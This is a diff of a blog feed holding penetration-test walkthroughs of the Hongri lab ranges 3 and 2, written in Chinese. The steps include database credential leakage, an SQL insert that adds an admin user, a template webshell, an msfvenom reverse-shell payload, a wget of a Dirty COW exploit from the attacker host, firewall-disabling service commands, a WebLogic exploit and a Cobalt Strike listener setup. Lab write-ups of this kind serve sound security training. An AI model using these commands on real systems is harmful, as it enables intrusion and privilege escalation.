@@ -6,7 +6,7 @@
     
             <link href="https://l1uyun.one/posts/sec/" rel="alternate" type="text/html" title="html" />
             <link href="https://l1uyun.one/posts/sec/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
-    <updated>2025-09-03T01:13:55+00:00</updated>
+    <updated>2025-09-04T12:43:56+00:00</updated>
     
     
     
@@ -46,22 +46,52 @@
 <h2 id="外网">外网</h2>
 <p>访问192.168.3.3</p>
 <h3 id="信息收集">信息收集</h3>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_1.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_1.png" alt="" /></figure>
+
+
+
 joomla cms
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_2.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_2.png" alt="" /></figure>
+
+
+
 这个cms之前打靶机的时候遇见过
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_3.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_3.png" alt="" /></figure>
+
+
+
 在README.txt中发现了版本信息(在http://192.168.3.3/administrator/manifests/files/joomla.xml中也有)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_4.png" alt="" /></figure>
+
+
+
 在exploit-db中查找一下,先看看两个sql注入,RealEstateManager和VehicleManager组件的,但是这台机器,这两个组件都没有</p>
 <p>后台弱口令登录失败,跑一下爆破脚本</p>
 <p>继续找一下nday,尝试了一下,没啥进展</p>
 <h3 id="数据库凭据泄露">数据库凭据泄露</h3>
 <p>回到目录扫描
 御剑扫一下
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_5.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_5.png" alt="" /></figure>
+
+
+
 phpinfo
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_6.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_6.png" alt="" /></figure>
+
+
+
 电脑卡起来了,御剑崩了,换成dirsearch,扫到了下面这个文件
 <code>http://192.168.3.3/configuration.php~</code>
 里面有数据库的账号密码</p>
@@ -72,7 +102,12 @@ phpinfo
 </span></span><span style="display:flex;"><span>	public $db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;joomla&#39;</span>;
 </span></span><span style="display:flex;"><span>	public $dbprefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;am2zu_&#39;</span>;
 </span></span></code></pre></div><p>navicat连一下
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt="" /></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin
 </span></span><span style="display:flex;"><span>$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy
 </span></span><span style="display:flex;"><span>
@@ -88,18 +123,43 @@ phpinfo
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_user_usergroup_map<span style="color:#f92672">`</span> (<span style="color:#f92672">`</span>user_id<span style="color:#f92672">`</span>,<span style="color:#f92672">`</span>group_id<span style="color:#f92672">`</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (LAST_INSERT_ID(),<span style="color:#e6db74">&#39;8&#39;</span>);
 </span></span></code></pre></div><p>然后使用admin2:secret登录进入后台
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_8.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_8.png" alt="" /></figure>
+
+
+</p>
 <h3 id="后台模板getshell">后台模板getshell</h3>
 <p>上传webshell,这里生成的是蚁剑的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_9.png" alt="|500"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_9.png" alt="|500" /><figcaption>|500</figcaption></figure>
+
+
+
 修改error.php,并保存
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_10.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_10.png" alt="" /></figure>
+
+
+
 路径是<code>http://192.168.3.3/templates/beez3/error.php</code></p>
 <h3 id="antsword">antsword</h3>
 <p>连上去了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_11.png" alt="" /></figure>
+
+
+
 加载插件之后执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_12.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_12.png" alt="" /></figure>
+
+
+
 存在内网ip 192.168.93.120</p>
 <p>传到msf里面吧</p>
 <pre tabindex="0"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.100 LPORT=4444 -f elf -o shell.elf
@@ -152,7 +212,12 @@ phpinfo
 </span></span></code></pre></div><h3 id="提权">提权</h3>
 <p>接下来要对内网的机器进一步渗透,这台公网机器需要作为跳板机,先得拿下root</p>
 <p>尝试一下脏牛
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt="" /></figure>
+
+
+</p>
 <p>上传.c文件,将文件里面的用户名改成root</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ wget 192.168.3.100/dirty.c
 </span></span><span style="display:flex;"><span>--2019-10-06 22:57:45--  http://192.168.3.100/dirty.c
@@ -180,7 +245,12 @@ phpinfo
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
 </span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 </span></span></code></pre></div><p>拿下root,将shell传到msf中,<a href="https://www.revshells.com" target="_blank" rel="noopener nofollow noreferrer" >msfvenom</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_14.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_14.png" alt="" /></figure>
+
+
+</p>
 <h3 id="搭建socks隧道">搭建socks隧道</h3>
 <p>参考之前在红日1里面的笔记<a href="%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f.md###%e6%90%ad%e5%bb%basocks%e9%9a%a7%e9%81%93">红日靶场1-win域</a></p>
 <pre tabindex="0"><code>run post/multi/manage/autoroute
@@ -232,9 +302,19 @@ Jobs
 </span></span><span style="display:flex;"><span>3306/tcp open   mysql
 </span></span><span style="display:flex;"><span>9191/tcp closed sun-as-jpda
 </span></span></code></pre></div><p>现在再回到蚁剑的后渗透模块,设置代理,使用bind-shell,传回msf
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_15.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_15.png" alt="" /></figure>
+
+
+
 linux的两台机器拿到了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt="" /></figure>
+
+
+
 还剩下三台win机器</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.93.10
 </span></span><span style="display:flex;"><span>192.168.93.20
@@ -397,7 +477,12 @@ linux的两台机器拿到了
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;100i 123qwe!ASD&#39;</span> rockyou.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>administrator:123qwe!ASD
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt="" /></figure>
+
+
+
 附上其他师傅的横向思路</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1、mssql要是拿到高权限（sa账号权限）可以尝试通过mssql写 shell 然后提权。
 </span></span><span style="display:flex;"><span>2、在进行横向移动时，内网设备扫不出来其他漏洞，只能通过 SMB 爆破或者 NTLM Relay 攻击，SMB 爆破比较碰运气，在实际过程中可以通过收集公司及管理员信息生成对应字典；NTLM Relay 攻击类似社工钓鱼，遇到安全意识不高的管理员才有可能成功，并且在内网环境中安装Python和对应的库也是比较麻烦的，可以考虑使用 conda 等创建虚拟环境，然后一起打包上传到对应靶机，但是相应的环境配置也是比较容易出问题。
@@ -499,11 +584,26 @@ linux的两台机器拿到了
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 start unablefirewall
 </span></span></code></pre></div><p>然后在使用msf的psexec模块拿shell
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_18.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_18.png" alt="" /></figure>
+
+
+</p>
 <p>发现还有不少东西要学,win和linux的免杀,win域渗透,权限维持&hellip;.我还要继续学下去吗,已经沉没的比较多了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_19.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_19.png" alt="" /></figure>
+
+
+</p>
 <p>最后偷一张拓扑图
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_20.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_20.png" alt="" /></figure>
+
+
+</p>
 <h1 id="引用">引用</h1>
 <p><a href="https://blog.csdn.net/qq_47289634/article/details/132021341" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/qq_47289634/article/details/132021341</a></p>
 <p><a href="https://blog.csdn.net/2301_76227305/article/details/139067562" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/2301_76227305/article/details/139067562</a></p>
@@ -542,44 +642,99 @@ linux的两台机器拿到了
 <p>环境和红日1的环境搭建差不多，不过这次给三台机器分别是域控、web服务器、个人PC机，与红日1不同的是这里将域管换成了个人PC机，因此我们的一些操作也会有所不同</p>
 <h1 id="红日靶场2_win域">红日靶场2_win域</h1>
 <h2 id="搭建环境">搭建环境</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png" alt="" /></figure>
+
+
+</p>
 <pre tabindex="0"><code>administrator
 1qaz@WSX
 默认密码都是1qaz@WSX
 </code></pre><p>这里需要模拟内网环境,所以需要弄一个内网网卡</p>
 <p>创建一个vmnet2
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png" alt="" /></figure>
+
+
+</p>
 <p>然后把三台机器的网卡2都改成这个vmnet2就行了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png" alt="" /></figure>
+
+
+
 DC机器不需要做什么处理,改完网卡直接启动就行</p>
 <p>这里的另外一个网卡,作者设置的是111网段,但是我习惯了自己的ip,所以选择改pc和web两台机器里面的ip</p>
 <p>先改一下pc这台机器,这台先改下ip
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_4.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_4.png" alt="" /></figure>
+
+
+
 再测试一下连通性,使用外部的parrot机器ping一下,没通,需要关闭防火墙
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_5.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_5.png" alt="" /></figure>
+
+
+</p>
 <p>最后配置web机器,web机器需要先将恢复快照1.3版本
 会出现一个报错,直接点放弃就行,<strong>这里恢复快照之后,需要重新改网卡,怪不得ping不通域控的</strong></p>
 <p>登录本地用户</p>
 <pre tabindex="0"><code>.\de1ay
 1qaz@WSX
 </code></pre><p>这里提示需要修改密码,我改成1qaz@WSX3
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_6.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_6.png" alt="" /></figure>
+
+
+
 进去之后直接注销掉,切换成域用户mssql,密码还是1qaz@WSX</p>
 <p>然后还是先改ip
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_7.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_7.png" alt="" /></figure>
+
+
+</p>
 <p>改完之后测试一下两个网段都能不能ping通</p>
 <p>ping不通的话得关一下web的防火墙,关掉之后就能ping通了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_8.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_8.png" alt="" /></figure>
+
+
+</p>
 <p>红日1是以phpstudy搭的一个web服务，红日2用的是weblogic。web服务中，我们需要手动打开weblogic</p>
 <p>进入这个路径<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>,没权限的时候,输管理员凭据就行.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_9.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_9.png" alt="" /></figure>
+
+
+
 以管理员身份启动一下weblogic
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_10.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_10.png" alt="" /></figure>
+
+
+</p>
 <p>搭建时参考的文章提到:
 WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动（Computer Browser 是关闭的,导致 net view 显示 6118 error 没能解决，在域信息收集时暂时关闭一下防火墙）</p>
 <p>我这里web里的Computer Browser是关闭的,我手动打开了,pc机器是正常的.</p>
 <p>访问192.168.3.80:7001/console,跳转进去登录页面,环境搭建成功
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt="" /></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web 192.168.3.80
 </span></span><span style="display:flex;"><span>pc  192.168.3.201
 </span></span><span style="display:flex;"><span>win 192.168.3.99
@@ -715,26 +870,71 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 <a href="weblogic-wls-wsat-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e.md">weblogic-wls-wsat-反序列化漏洞</a>
 这个检测脚本卡主了,上一键利用工具了</p>
 <p>CVE-2016-0638
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_12.png" alt=""  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_13.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_12.png" alt="" /></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_13.png" alt="" /></figure>
+
+
+</p>
 <h3 id="antsword_内存马">antsword_内存马</h3>
 <p>使用这个工具里面的内存马,上传antsword_Custom_Filter内存马</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_14.png" alt="|650"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_14.png" alt="|650" /><figcaption>|650</figcaption></figure>
+
+
+</p>
 <p>进去之后查看ip,是存在内网环境的
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_15.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_15.png" alt="" /></figure>
+
+
+</p>
 <h2 id="内网">内网</h2>
 <p>这里还有一台PC机器是暴露在外网环境中的,但是已经拿了web机器的shell,就先进内网</p>
 <h3 id="信息收集-1">信息收集</h3>
 <p>局域网机器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_16.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_16.png" alt="" /></figure>
+
+
+
 本机信息
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_17.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_17.png" alt="" /></figure>
+
+
+
 无法查看域用户
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_18.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_18.png" alt="" /></figure>
+
+
+
 本地管理员组,这里面有域用户DE1AY\Domain Admins这个域用户
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_19.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_19.png" alt="" /></figure>
+
+
+
 域信息
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_20.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_20.png" alt="" /></figure>
+
+
+</p>
 <h3 id="cs上线">CS上线</h3>
 <p>添加监听器</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>name：为监听器名字，可任意
@@ -742,23 +942,63 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 </span></span><span style="display:flex;"><span>HTTP Hosts: shell反弹的主机，也就是我们kali的ip（如果是阿里云，则填阿里云主机的公网ip）
 </span></span><span style="display:flex;"><span>HTTP Hosts(Stager): Stager的马请求下载payload的地址（一般也是和上面的ip填一样）
 </span></span><span style="display:flex;"><span>HTTP Port(C2): C2监听的端口
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_21.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_21.png" alt="" /></figure>
+
+
+
 创建payload
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_22.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_22.png" alt="" /></figure>
+
+
+
 上传马子,将shell传到cs上
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_23.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_23.png" alt="" /></figure>
+
+
+</p>
 <p>获取明文凭据
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_24.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_24.png" alt="" /></figure>
+
+
+</p>
 <p>rdp也能连上去
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_25.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_25.png" alt="" /></figure>
+
+
+
 噢,简称和完整域名的区别
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_26.png" alt=""  /></p>
+
+<figure class="md-figure">
